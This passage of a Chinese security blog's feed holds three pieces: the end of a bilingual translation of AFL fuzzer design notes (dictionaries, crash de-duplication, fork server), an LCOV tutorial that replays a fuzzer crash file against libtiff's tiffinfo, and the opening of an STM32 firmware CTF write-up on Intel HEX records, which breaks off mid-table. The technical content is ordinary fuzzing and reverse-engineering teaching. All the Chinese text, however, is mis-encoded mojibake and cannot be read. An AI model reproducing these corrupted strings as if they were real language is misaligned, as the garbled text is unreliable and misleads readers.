effect on the checksum of the<br>execution path, they may be excluded from the remaining phases of<br>deterministic fuzzing - and the fuzzer may proceed straight to random tweaks.<br>Especially for verbose, human-readable data formats, this can reduce the number<br>of execs by 10-40% or so without an appreciable drop in coverage. In extreme<br>cases, such as normally block-aligned tar archives, the gains can be as high as<br>90%.</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤è§„åˆ™æœ‰ä¸€ä¸ªï¼ˆå¾®ä¸è¶³é“çš„ï¼‰ä¾‹å¤–ï¼šå½“æ–°é˜Ÿåˆ—æ¡ç›®ç»å†åˆå§‹çš„ä¸€ç»„ç¡®å®šæ€§æ¨¡ç³Šæ­¥éª¤æ—¶ï¼Œè§‚å¯Ÿåˆ°å¯¹æ–‡ä»¶ä¸­æŸäº›åŒºåŸŸçš„è°ƒæ•´å¯¹æ‰§è¡Œè·¯å¾„çš„æ ¡éªŒå’Œæ²¡æœ‰å½±å“ï¼Œå®ƒä»¬å¯èƒ½ä¼šè¢«æ’é™¤åœ¨ç¡®å®šæ€§æ¨¡ç³Šæµ‹è¯•çš„å‰©ä½™é˜¶æ®µä¹‹å¤– - å¹¶ä¸”æ¨¡ç³Šå™¨å¯èƒ½ä¼šç›´æ¥è¿›è¡Œéšæœºè°ƒæ•´ã€‚ç‰¹åˆ«æ˜¯å¯¹äºå†—é•¿çš„ã€äººç±»å¯è¯»çš„æ•°æ®æ ¼å¼ï¼Œè¿™å¯ä»¥å°†æ‰§è¡Œæ•°é‡å‡å°‘ 10-40% å·¦å³ï¼Œè€Œè¦†ç›–ç‡ä¸ä¼šæ˜æ˜¾ä¸‹é™ã€‚åœ¨æç«¯æƒ…å†µä¸‹ï¼Œä¾‹å¦‚é€šå¸¸å—å¯¹é½çš„ tar å­˜æ¡£ï¼Œå¢ç›Šå¯é«˜è¾¾ 90%ã€‚</p><blockquote><p>Because the underlying â€œeffector mapsâ€ are local every queue entry and remain<br>in force only during deterministic stages that do not alter the size or the<br>general layout of the underlying file, this mechanism appears to work very<br>reliably and proved to be simple to implement.</p></blockquote><p>ç”±äºåº•å±‚â€œæ•ˆåº”å™¨æ˜ å°„â€æ˜¯æ¯ä¸ªé˜Ÿåˆ—æ¡ç›®çš„æœ¬åœ°ä¿¡æ¯ï¼Œå¹¶ä¸”ä»…åœ¨ä¸æ”¹å˜åº•å±‚æ–‡ä»¶çš„å¤§å°æˆ–æ€»ä½“å¸ƒå±€çš„ç¡®å®šæ€§é˜¶æ®µä¿æŒæœ‰æ•ˆï¼Œå› æ­¤è¯¥æœºåˆ¶ä¼¼ä¹å·¥ä½œéå¸¸å¯é ï¼Œå¹¶ä¸”è¢«è¯æ˜æ˜“äºå®ç°ã€‚</p><h2 id="7ï¼‰Dictionaries-å­—å…¸"><a href="#7ï¼‰Dictionaries-å­—å…¸" class="headerlink" title="7ï¼‰Dictionaries å­—å…¸"></a>7ï¼‰Dictionaries å­—å…¸</h2><blockquote><p>The feedback provided by the instrumentation makes it easy to automatically<br>identify syntax tokens in some types of input files, and to detect that certain<br>combinations of predefined or auto-detected dictionary terms constitute a<br>valid grammar for the tested parser.</p></blockquote><p>ä»ªå™¨æä¾›çš„åé¦ˆä½¿å¾—è‡ªåŠ¨è¯†åˆ«æŸäº›ç±»å‹çš„è¾“å…¥æ–‡ä»¶ä¸­çš„è¯­æ³•æ ‡è®°å˜å¾—å®¹æ˜“ï¼Œå¹¶æ£€æµ‹é¢„å®šä¹‰æˆ–è‡ªåŠ¨æ£€æµ‹çš„å­—å…¸æœ¯è¯­çš„æŸäº›ç»„åˆæ˜¯å¦æ„æˆäº†æµ‹è¯•è§£æå™¨çš„æœ‰æ•ˆè¯­æ³•ã€‚</p><p>æœ‰å…³å¦‚ä½•åœ¨ afl-fuzz ä¸­å®ç°è¿™äº›åŠŸèƒ½çš„è®¨è®ºå¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°:<br><a href="http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html">http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html</a></p><blockquote><p>In essence, when basic, typically easily-obtained syntax tokens are combined<br>together in a purely random manner, the instrumentation and the evolutionary<br>design of the queue together provide a feedback mechanism to differentiate<br>between meaningless mutations and ones that trigger new behaviors in the<br>instrumented code - and to incrementally build more complex syntax on top of<br>this discovery.</p></blockquote><p>æœ¬è´¨ä¸Šï¼Œå½“åŸºæœ¬çš„ã€é€šå¸¸å®¹æ˜“è·å¾—çš„è¯­æ³•æ ‡è®°ä»¥çº¯ç²¹éšæœºçš„æ–¹å¼ç»„åˆåœ¨ä¸€èµ·æ—¶ï¼Œé˜Ÿåˆ—çš„æ£€æµ‹å’Œè¿›åŒ–è®¾è®¡ä¸€èµ·æä¾›äº†ä¸€ç§åé¦ˆæœºåˆ¶ï¼Œä»¥åŒºåˆ†æ— æ„ä¹‰çš„çªå˜å’Œåœ¨æ£€æµ‹ä»£ç ä¸­è§¦å‘æ–°è¡Œä¸ºçš„çªå˜- å¹¶åœ¨æ­¤å‘ç°çš„åŸºç¡€ä¸Šé€æ­¥æ„å»ºæ›´å¤æ‚çš„è¯­æ³•ã€‚</p><blockquote><p>The dictionaries have been shown to enable the fuzzer to rapidly reconstruct<br>the grammar of highly verbose and complex languages such as JavaScript, SQL,<br>or XML; several examples of generated SQL statements are given in the blog<br>post mentioned above.</p></blockquote><p>äº‹å®è¯æ˜ï¼Œå­—å…¸å¯ä»¥ä½¿æ¨¡ç³Šå™¨å¿«é€Ÿé‡å»ºé«˜åº¦å†—é•¿å’Œå¤æ‚çš„è¯­è¨€ï¼ˆä¾‹å¦‚ JavaScriptã€SQL æˆ– XMLï¼‰çš„è¯­æ³•ï¼›ä¸Šé¢æåˆ°çš„åšå®¢æ–‡ç« ä¸­ç»™å‡ºäº†ç”Ÿæˆ SQL è¯­å¥çš„å‡ ä¸ªç¤ºä¾‹ã€‚</p><blockquote><p>Interestingly, the AFL instrumentation also allows the fuzzer to automatically<br>isolate syntax tokens already present in an input file. It can do so by looking<br>for run of bytes that, when flipped, produce a consistent change to the<br>programâ€™s execution path; this is suggestive of an underlying atomic comparison<br>to a predefined value baked into the code. The fuzzer relies on this signal<br>to build compact â€œauto dictionariesâ€ that are then used in conjunction with<br>other fuzzing strategies.</p></blockquote><p>æœ‰è¶£çš„æ˜¯ï¼ŒAFL æ£€æµ‹è¿˜å…è®¸æ¨¡ç³Šå™¨è‡ªåŠ¨éš”ç¦»è¾“å…¥æ–‡ä»¶ä¸­å·²å­˜åœ¨çš„è¯­æ³•æ ‡è®°ã€‚å®ƒå¯ä»¥é€šè¿‡æŸ¥æ‰¾å­—èŠ‚è¿è¡Œæ¥å®ç°è¿™ä¸€ç‚¹ï¼Œè¿™äº›å­—èŠ‚åœ¨ç¿»è½¬æ—¶ä¼šå¯¹ç¨‹åºçš„æ‰§è¡Œè·¯å¾„äº§ç”Ÿä¸€è‡´çš„æ›´æ”¹ï¼›è¿™è¡¨æ˜ä»£ç ä¸­é¢„å®šä¹‰å€¼å­˜åœ¨åº•å±‚åŸå­åŒ–çš„æ¯”è¾ƒã€‚æ¨¡ç³Šå™¨ä¾é è¿™ä¸ªä¿¡å·æ¥æ„å»ºç´§å‡‘çš„â€œè‡ªåŠ¨å­—å…¸â€ï¼Œç„¶åä¸å…¶ä»–æ¨¡ç³Šç­–ç•¥ç»“åˆä½¿ç”¨ã€‚</p><h2 id="8ï¼‰De-duping-crashes-é‡å¤æ•°æ®åˆ é™¤å´©æºƒ"><a href="#8ï¼‰De-duping-crashes-é‡å¤æ•°æ®åˆ é™¤å´©æºƒ" class="headerlink" title="8ï¼‰De-duping crashes é‡å¤æ•°æ®åˆ é™¤å´©æºƒ"></a>8ï¼‰De-duping crashes é‡å¤æ•°æ®åˆ é™¤å´©æºƒ</h2><blockquote><p>De-duplication of crashes is one of the more important problems for any<br>competent fuzzing tool. Many of the naive approaches run into problems; in<br>particular, looking just at the faulting address may lead to completely<br>unrelated issues being clustered together if the fault happens in a common<br>library function (say, strcmp, strcpy); while checksumming call stack<br>backtraces can lead to extreme crash count inflation if the fault can be<br>reached through a number of different, possibly recursive code paths.</p></blockquote><p>å¯¹äºä»»ä½•æœ‰èƒ½åŠ›çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·æ¥è¯´ï¼Œå¦‚ä½•åˆ é™¤é‡å¤æ•°æ®æ˜¯æœ€é‡è¦çš„é—®é¢˜ä¹‹ä¸€ã€‚è®¸å¤šç®€å•çš„æ–¹æ³•éƒ½ä¼šé‡åˆ°é—®é¢˜ã€‚å°¤å…¶æ˜¯ï¼Œå¦‚æœæ•…éšœå‘ç”Ÿåœ¨å…¬å…±åº“å‡½æ•°ï¼ˆä¾‹å¦‚ strcmpã€strcpyï¼‰ä¸­ï¼Œåˆ™ä»…æŸ¥çœ‹æ•…éšœåœ°å€å¯èƒ½ä¼šå¯¼è‡´å®Œå…¨ä¸ç›¸å…³çš„é—®é¢˜èšé›†åœ¨ä¸€èµ·ï¼›å¦‚æœå¯ä»¥é€šè¿‡è®¸å¤šä¸åŒçš„ã€å¯èƒ½æ˜¯é€’å½’çš„ä»£ç è·¯å¾„åˆ°è¾¾æ•…éšœï¼Œåˆ™å¯¹è°ƒç”¨å †æ ˆå›æº¯è¿›è¡Œæ ¡éªŒå’Œå¯èƒ½ä¼šå¯¼è‡´å¤§é‡å¼‚å¸¸çš„å´©æºƒè®¡æ•°ã€‚</p><blockquote><p>The solution implemented in afl-fuzz considers a crash unique if any of two<br>conditions are met:</p><ul><li>The crash trace includes a tuple not seen in any of the previous crashes,</li><li>The crash trace is missing a tuple that was always present in earlier faults.<br>å¦‚æœæ»¡è¶³ä¸‹åˆ—ä¸¤ä¸ªæ¡ä»¶çš„ä»»æ„ä¸€ç§ï¼Œafl-fuzzä¸­å®ç°çš„è§£å†³æ–¹æ¡ˆå°±ä¼šå°†å…¶è®¤å®šä¸ºä¸€ç§crash</li></ul></blockquote><ul><li>è‹¥è¿™ä¸ªcrashåŒ…å«ä¸€ä¸ªä»æœªåœ¨å…¶ä»–crashä¸­å‡ºç°è¿‡çš„å…ƒç»„</li><li>è‹¥è¿™ä¸ªcrashä¸åŒ…å«ä¸€ä¸ªæ€»æ˜¯åœ¨å…¶ä»–crashä¸­å‡ºç°çš„å…ƒç»„</li></ul><blockquote><p>The approach is vulnerable to some path count inflation early on, but exhibits<br>a very strong self-limiting effect, similar to the execution path analysis<br>logic that is the cornerstone of afl-fuzz.</p></blockquote><p>è¯¥æ–¹æ³•æ—©æœŸå®¹æ˜“å—åˆ°è·¯å¾„è®¡æ•°è†¨èƒ€çš„å½±å“ï¼Œä½†å…¶è¡¨ç°å‡ºéå¸¸å¼ºçš„è‡ªæˆ‘é™åˆ¶æ•ˆåº”ï¼ŒåŒæ ·ä½“ç°åœ¨ afl-fuzz åŸºçŸ³çš„æ‰§è¡Œè·¯å¾„åˆ†æé€»è¾‘ã€‚</p><h2 id="9ï¼‰Investigating-crashes-è°ƒæŸ¥å´©æºƒ"><a href="#9ï¼‰Investigating-crashes-è°ƒæŸ¥å´©æºƒ" class="headerlink" title="9ï¼‰Investigating crashes è°ƒæŸ¥å´©æºƒ"></a>9ï¼‰Investigating crashes è°ƒæŸ¥å´©æºƒ</h2><blockquote><p>The exploitability of many types of crashes can be ambiguous; afl-fuzz tries<br>to address this by providing a crash exploration mode where a known-faulting<br>test case is fuzzed in a manner very similar to the normal operation of the<br>fuzzer, but with a constraint that causes any non-crashing mutations to be<br>thrown away.</p></blockquote><p>è®¸å¤šç±»å‹çš„å´©æºƒçš„å¯åˆ©ç”¨æ€§å¯èƒ½æ˜¯ä¸æ˜ç¡®çš„ï¼› afl-fuzz è¯•å›¾é€šè¿‡æä¾›å´©æºƒæ¢ç´¢æ¨¡å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶ä¸­å·²çŸ¥æ•…éšœçš„æµ‹è¯•ç”¨ä¾‹ä»¥ä¸æ¨¡ç³Šå™¨æ­£å¸¸æ“ä½œéå¸¸ç›¸ä¼¼çš„æ–¹å¼è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œä½†æœ‰ä¸€ä¸ªçº¦æŸï¼Œå¯¼è‡´ä»»ä½•éå´©æºƒçš„çªå˜éƒ½è¢«ä¸¢å¼ƒã€‚</p><p>æœ‰å…³æ­¤æ–¹æ³•ä»·å€¼çš„è¯¦ç»†è®¨è®ºå¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°</p><ul><li><a href="http://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html">http://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html</a></li></ul><blockquote><p>The method uses instrumentation feedback to explore the state of the crashing<br>program to get past the ambiguous faulting condition and then isolate the<br>newly-found inputs for human review.</p></blockquote><p>è¯¥æ–¹æ³•ä½¿ç”¨ä»ªå™¨åé¦ˆæ¥æ¢ç´¢å´©æºƒç¨‹åºçš„çŠ¶æ€ï¼Œä»¥å…‹æœæ¨¡ç³Šçš„æ•…éšœæ¡ä»¶ï¼Œç„¶åéš”ç¦»æ–°å‘ç°çš„è¾“å…¥ä»¥ä¾›äººå·¥å®¡æŸ¥ã€‚</p><blockquote><p>On the subject of crashes, it is worth noting that in contrast to normal<br>queue entries, crashing inputs are <em>not</em> trimmed; they are kept exactly as<br>discovered to make it easier to compare them to the parent, non-crashing entry<br>in the queue. That said, afl-tmin can be used to shrink them at will.</p></blockquote><p>å…³äºå´©æºƒé—®é¢˜ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸æ­£å¸¸é˜Ÿåˆ—æ¡ç›®ç›¸æ¯”ï¼Œå´©æºƒè¾“å…¥<strong>ä¸ä¼š</strong>è¢«ä¿®å‰ªï¼›å®ƒä»¬å®Œå…¨æŒ‰ç…§å‘ç°çš„æ–¹å¼ä¿å­˜ï¼Œä»¥ä¾¿æ›´å®¹æ˜“å°†å®ƒä»¬ä¸é˜Ÿåˆ—ä¸­çš„çˆ¶éå´©æºƒæ¡ç›®è¿›è¡Œæ¯”è¾ƒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œafl-tmin å¯ä»¥ç”¨æ¥éšæ„ç¼©å°å®ƒä»¬ã€‚</p><h2 id="10ï¼‰The-fork-server"><a href="#10ï¼‰The-fork-server" class="headerlink" title="10ï¼‰The fork server"></a>10ï¼‰The fork server</h2><blockquote><p>To improve performance, afl-fuzz uses a â€œfork serverâ€, where the fuzzed process<br>goes through execve(), linking, and libc initialization only once, and is then<br>cloned from a stopped process image by leveraging copy-on-write. The<br>implementation is described in more detail here:</p></blockquote><p>ä¸ºäº†æé«˜æ€§èƒ½ï¼Œafl-fuzz ä½¿ç”¨<strong>â€œfork serverâ€</strong>ï¼Œå…¶ä¸­æ¨¡ç³ŠåŒ–è¿›ç¨‹ä»…æ‰§è¡Œä¸€æ¬¡ execve()ã€é“¾æ¥å’Œ libc åˆå§‹åŒ–ï¼Œç„¶åé€šè¿‡åˆ©ç”¨<strong>copy-on-write</strong>ä»åœæ­¢çš„è¿›ç¨‹æ˜ åƒè¿›è¡Œå…‹éš†ã€‚è¿™é‡Œæ›´è¯¦ç»†åœ°æè¿°äº†è¯¥å®ç°ï¼š</p><ul><li><a href="http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</a></li></ul><blockquote><p>The fork server is an integral aspect of the injected instrumentation and<br>simply stops at the first instrumented function to await commands from<br>afl-fuzz.</p></blockquote><p>fork serveræ˜¯æ³¨å…¥æ£€æµ‹çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå®ƒåªæ˜¯åœ¨ç¬¬ä¸€ä¸ªæ£€æµ‹å‡½æ•°å¤„åœæ­¢ä»¥ç­‰å¾…æ¥è‡ª afl-fuzz çš„å‘½ä»¤ã€‚</p><blockquote><p>With fast targets, the fork server can offer considerable performance gains,<br>usually between 1.5x and 2x. It is also possible to:</p><ul><li>Use the fork server in manual (â€œdeferredâ€) mode, skipping over larger, user-selected chunks of initialization code. It requires very modest code changes to the targeted program, and With some targets, can produce 10x+ performance gains.</li><li>Enable â€œpersistentâ€ mode, where a single process is used to try out multiple inputs, greatly limiting the overhead of repetitive fork() calls. This generally requires some code changes to the targeted program, but can improve the performance of fast targets by a factor of 5 or more - approximating the benefits of in-process fuzzing jobs while still maintaining very robust isolation between the fuzzer process and the targeted binary.</li></ul></blockquote><p>å¯¹äºfastç›®æ ‡ï¼Œfork serverå¯ä»¥æä¾›ç›¸å½“å¤§çš„æ€§èƒ½æå‡ï¼Œé€šå¸¸åœ¨1.5å€åˆ°2å€ä¹‹é—´ã€‚è¿˜å¯ä»¥ï¼š</p><ul><li>åœ¨æ‰‹åŠ¨çš„ï¼ˆâ€œdeferredâ€ï¼‰æ¨¡å¼ä¸‹ä½¿ç”¨fork serverï¼Œè·³è¿‡è¾ƒå¤§çš„ã€ç”¨æˆ·é€‰æ‹©çš„åˆå§‹åŒ–ä»£ç å—ã€‚å®ƒéœ€è¦å¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œæ°åˆ°å¥½å¤„çš„ä»£ç æ›´æ”¹ï¼Œå¹¶ä¸”å¯¹äºæŸäº›ç›®æ ‡ï¼Œå¯ä»¥äº§ç”Ÿ10å€ä»¥ä¸Šçš„æ€§èƒ½æå‡</li><li>å¯ç”¨â€œpersistentâ€æ¨¡å¼ï¼Œå…¶ä¸­å•ä¸ªè¿›ç¨‹ç”¨äºå°è¯•å¤šä¸ªè¾“å…¥ï¼Œæå¤§çš„é™åˆ¶äº†é‡å¤<code>fork()</code>è°ƒç”¨çš„å¼€é”€ã€‚è¿™é€šå¸¸éœ€è¦å¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œä¸€äº›ä»£ç æ›´æ”¹ï¼Œå¤§å¯ä»¥å°†fastç›®æ ‡çš„æ€§èƒ½æé«˜5å€æˆ–è€…æ›´å¤š - è¿‘ä¼¼äºè¿›ç¨‹å†…æ¨¡ç³Šæµ‹è¯•ä½œä¸šçš„å¥½å¤„ï¼ŒåŒæ—¶ä»ç„¶ä¿æŒfuzzerè¿›ç¨‹å’Œç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹é—´å·¨å¤§çš„éš”ç¦»ã€‚</li></ul><h2 id="å…¶ä»–éƒ¨åˆ†"><a href="#å…¶ä»–éƒ¨åˆ†" class="headerlink" title="å…¶ä»–éƒ¨åˆ†"></a>å…¶ä»–éƒ¨åˆ†</h2><p>å‰©ä¸‹3ç« æ„Ÿè§‰ä¸æ˜¯å¾ˆé‡è¦ï¼Œå¯ä»¥è‡ªå·±å»çœ‹çœ‹ã€‚ä¹‹åæœ‰ç©ºå†è¡¥ä¸Šè¿™éƒ¨åˆ†å§</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€fuzz trickã€‘åˆ©ç”¨LCOVæµ‹é‡ä»£ç è¦†ç›–ç‡</title>
    <link href="/2023/08/22/%E3%80%90fuzz%20trick%E3%80%91%E5%88%A9%E7%94%A8LCOV%E6%B5%8B%E9%87%8F%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"/>
    <url>/2023/08/22/%E3%80%90fuzz%20trick%E3%80%91%E5%88%A9%E7%94%A8LCOV%E6%B5%8B%E9%87%8F%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡æ ·ä¾‹ä¸ºLibTIFF version 4.0.4ï¼Œä»¥CVE-2016-9297æ¼æ´ä¸¾ä¾‹ </p></blockquote><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>ç›´æ¥ä½¿ç”¨<code>apt</code>å®‰è£…åŒ…å³å¯</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt install lcov<br></code></pre></td></tr></table></figure><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>æ•´ä½“æµç¨‹å¤§è‡´å¦‚ä¸‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> ./tiff-4.0.4/<br>lcov --zerocounters --directory ./<br>lcov --capture --initial --directory ./ --output-file app.info<br>../install/bin/tiffinfo -D -j -c -r -s -w ../out/default/crashes/id:000000,sig:06,src:000000,time:11605,execs:6660,op:havoc,rep:4<br>lcov --no-checksum --directory ./ --capture --output-file app2.info<br></code></pre></td></tr></table></figure><p>æ¯ä¸ªéƒ¨åˆ†å«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li><code>lcov --zerocounters --directory ./</code>ï¼Œç”¨äºé‡ç½®è®¡æ•°å™¨</li><li><code>lcov --capture --initial --directory ./ --output-file app.info</code>ï¼Œåˆ›å»ºä¸€ä¸ªâ€baselineâ€è¦†ç›–ç‡æ•°æ®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¯ä¸ªæ£€æµ‹çº¿çš„é›¶è¦†ç›–ç‡</li><li><code>../install/bin/tiffinfo -D -j -c -r -s -w ../out/default/crashes/id:000000,sig:06,src:000000,time:11605,execs:6660,op:havoc,rep:4</code>ï¼Œè¿è¡Œè¦åˆ†æçš„ç¨‹åºå’Œè¾“å…¥ï¼Œæˆ–æ˜¯fuzzå‡ºçš„crashæ ·æœ¬ï¼Œè¿™ä¸€æ­¥å¯ä»¥å¤šæ¬¡è¿è¡Œä¸åŒçš„è¾“å…¥ç”¨äºæµ‹é‡è¦†ç›–ç‡</li><li><code>lcov --no-checksum --directory ./ --capture --output-file app2.info</code>ï¼Œå°†ä¸Šä¸€æ­¥å‡ºç°çš„è¦†ç›–çŠ¶æ€ä¿å­˜åœ¨<strong>app2.info</strong></li></ul><p>æœ€åï¼Œæˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ªhtmlæ–‡ä»¶æ–¹ä¾¿æˆ‘ä»¬æŸ¥çœ‹è¦†ç›–ç‡æƒ…å†µ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info<br></code></pre></td></tr></table></figure><p>å¦‚æœæ­£å¸¸çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰“å¼€<code>./html-coverage/index.html</code>ï¼ŒæŸ¥çœ‹è¦†ç›–ç‡çŠ¶å†µ</p><p><img src="/img/article/lcov/Image2_2.png" alt="coverage"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOTã€‘åµŒå…¥å¼è®¾å¤‡å›ºä»¶åˆ†æ</title>
    <link href="/2023/07/12/%E3%80%90IOT%E3%80%91%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2023/07/12/%E3%80%90IOT%E3%80%91%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>åµŒå…¥å¼è®¾å¤‡å›ºä»¶ä¸€èˆ¬å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>æœ‰æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚è·¯ç”±å™¨å›ºä»¶è¿™ç§ï¼‰</li><li>æ— æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚STM32è¿™ç§åµŒå…¥å¼è®¾å¤‡å›ºä»¶ï¼Œç¨‹åºç›´æ¥å­˜æ”¾åœ¨flashä¸­ï¼‰</li></ul><p>é’ˆå¯¹ç¬¬ä¸€ç±»å›ºä»¶ï¼Œåˆ†æèµ·æ¥æ¯”è¾ƒç®€å•ï¼Œç›´æ¥binwalkåˆ†ç¦»ã€‚ç„¶åå»é€†å‘å¯¹åº”çš„æœåŠ¡å¯¹åº”çš„äºŒè¿›åˆ¶ç¨‹åºå³å¯ï¼Œä¹Ÿä¸éœ€è¦è€ƒè™‘ç¨‹åºçš„åŠ è½½åœ°å€ã€‚</p><p>è€Œå¯¹äºç¬¬äºŒç±»å›ºä»¶ï¼Œå¾€å¾€å°±ä¼šæ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦åˆ†æç¨‹åºçš„åŠ è½½åœ°å€ï¼Œä¹Ÿéœ€è¦è€ƒè™‘å¤–è®¾çš„åœ°å€æ˜ å°„ã€‚</p><blockquote><p>æœ¬æ–‡å°†ä»SCTF2020çš„é¢˜ç›®Password Lockå…¥æ‰‹ï¼Œåˆ†æSTM32å›ºä»¶ä½œä¸ºå…¥é—¨</p></blockquote><h2 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h2><p>è¿™æ˜¯ä¸€ä¸ªSTM32F103C8T6 MCUå¯†ç é”, å®ƒå…·æœ‰4ä¸ªæŒ‰é”®ï¼Œåˆ†åˆ«ä¸º1, 2, 3, 4. åˆ†åˆ«å¯¹åº”GPIO_PA1, GPIO_PA2, GPIO_PA3, GPIO_PA4.</p><ol><li>flag1æ ¼å¼ä¸ºSCTF{æ­£ç¡®çš„æŒ‰é”®å¯†ç }</li><li>è¾“å…¥æ­£ç¡®çš„å¯†ç , å®ƒå°†é€šè¿‡ä¸²å£(PA9â€“TX)å‘é€flag2</li></ol><h2 id="ç¡®å®šå›ºä»¶åŠ è½½åœ°å€"><a href="#ç¡®å®šå›ºä»¶åŠ è½½åœ°å€" class="headerlink" title="ç¡®å®šå›ºä»¶åŠ è½½åœ°å€"></a>ç¡®å®šå›ºä»¶åŠ è½½åœ°å€</h2><p>è¿™é‡Œæœ‰ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ç¡®å®šï¼Œä¸€ä¸ªæ˜¯ç›´æ¥åˆ†æIntel Hexæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯å»çœ‹èŠ¯ç‰‡å¯¹åº”çš„å†…å­˜æ˜ å°„å›¾ï¼ˆå¯ä»¥é€šè¿‡<a href="https://www.alldatasheet.com/">ALLDATASHEET.COM</a>å»æœç´¢èŠ¯ç‰‡ä¿¡æ¯ï¼‰</p><h3 id="åˆ†æIntel-Hexæ–‡ä»¶"><a href="#åˆ†æIntel-Hexæ–‡ä»¶" class="headerlink" title="åˆ†æIntel Hexæ–‡ä»¶"></a>åˆ†æIntel Hexæ–‡ä»¶</h3><blockquote><p>æœ¬æ¨¡å—å¯ä»¥å‚è€ƒ<a href="https://en.wikipedia.org/wiki/Intel_HEX">Intel HEX - Wikipedia â€” è‹±ç‰¹å°”åå…­è¿›åˆ¶ - ç»´åŸºç™¾ç§‘</a></p></blockquote><p>Intel Hexå¯ä»¥ç›´æ¥ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œæˆ‘ä»¬ä»¥æœ¬é¢˜çš„ç¬¬ä¸€è¡Œä¸ºä¾‹åˆ†æå…¶æ•°æ®æ ¼å¼</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">:020000040800F2<br></code></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªç¬¦åˆ<code>:</code>ä»£è¡¨æ²¡ä¸€è¡Œæ•°æ®çš„èµ·å§‹ï¼Œä¸ºstart code</li><li>ä¹‹åçš„ç¬¬ä¸€ä¸ªbyte<code>02</code>ä¸ºByte Countï¼Œä»£è¡¨dataçš„é•¿åº¦</li><li>ç´§æ¥ç€çš„ä¸¤ä¸ªå­—èŠ‚<code>0000</code>ä¸ºAddress</li><li>æ¥ä¸‹æ¥çš„ä¸€ä¸ªå­—èŠ‚<code>04</code>ä¸ºrecord typeï¼Œæ€»å…±æœ‰6ä¸ªç±»å‹ï¼ˆ00æ•°æ®ï¼Œ01æ–‡ä»¶ç»“å°¾ï¼Œ02æ‹“å±•åˆ†æ®µåœ°å€ï¼Œ03å¼€å§‹æ®µåœ°å€ï¼Œ04æ‹“å±•çº¿æ€§åœ°å€ï¼Œ05èµ·å§‹çº¿æ€§åœ°å€ï¼‰</li><li>æ¥ä¸‹æ¥ç›´åˆ°æœ€åä¸€ä¸ªå­—èŠ‚ä¹‹å‰ä¸ºæ•°æ®dataï¼Œ</li><li>æœ€åä¸€ä¸ªå­—èŠ‚F2ä¸ºæ ¡éªŒå’Œï¼Œæ ¡éªŒå’Œä¸ºæ‰€æœ‰å­—èŠ‚ä¹‹å’Œçš„è¡¥ç </li></ul><p>è¿™é‡Œä¸»è¦record typeè¿™ä¸ªå­—æ®µéœ€è¦æ³¨æ„</p><table><thead><tr><th align="center">hex</th><th align="center">type</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">æ•°æ®</td><td align="center">ç”±byte countå­—æ®µå†³å®šdataå­—æ®µçš„æ•°æ®é•¿åº¦</td><td align="center">:0B0010006164647265737320676170A7</td></tr><tr><td align="center">01</td><td align="center">æ–‡ä»¶ç»“å°¾</td><td 